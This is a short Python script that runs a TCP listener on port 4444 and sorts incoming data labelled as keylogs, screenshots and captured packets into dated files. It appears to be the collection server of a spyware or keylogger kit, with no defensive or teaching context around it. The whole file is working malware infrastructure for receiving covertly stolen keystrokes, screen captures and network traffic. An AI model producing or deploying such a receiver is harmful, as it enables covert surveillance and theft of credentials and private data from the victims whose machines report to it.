import socket
import os
import time

KEYLOG_DIR = r"C:\Users\<User>\Downloads"
SCREENSHOT_DIR = r"C:\Users\<User>\Downloads"
PACKETS_DIR = r"C:\Users\<User>\Downloads"
HOST = "127.0.0.1"
PORT = 4444

def start_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen(5)
        while True:
            client, addr = server.accept()
            handle_client(client)

def handle_client(client):
    try:
        data = b""
        while True:
            chunk = client.recv(4096)
            if not chunk:
                break
            data += chunk
        process_data(data)
    except:
        pass
    finally:
        client.close()

def process_data(data):
    lines = data.split(b"\n", 1)
    if len(lines) < 2:
        return
    header = lines[0].strip()
    payload = lines[1]
    if header.startswith(b"[keylog]"):
        save_keylog(payload)
    elif header.startswith(b"[screenshot]"):
        save_screenshot(header, payload)
    elif header.startswith(b"[packets]"):
        save_packets(payload)

def save_keylog(payload):
    stamp = time.strftime("%Y-%m-%d")
    os.makedirs(KEYLOG_DIR, exist_ok=True)
    path = os.path.join(KEYLOG_DIR, f"{stamp}_keylog.txt")
    with open(path, "ab") as f:
        f.write(payload)

def save_screenshot(header, payload):
    stamp = header.split(b"]")[1]
    stamp = stamp.strip()
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    shot_name = f"screenshot_{stamp.decode()}.png"
    path = os.path.join(SCREENSHOT_DIR, shot_name)
    with open(path, "wb") as f:
        f.write(payload)

def save_packets(payload):
    stamp = time.strftime("%Y-%m-%d")
    os.makedirs(PACKETS_DIR, exist_ok=True)
    path = os.path.join(PACKETS_DIR, f"{stamp}_packets.txt")
    with open(path, "ab") as f:
        f.write(payload)

if __name__ == "__main__":
    start_listener()
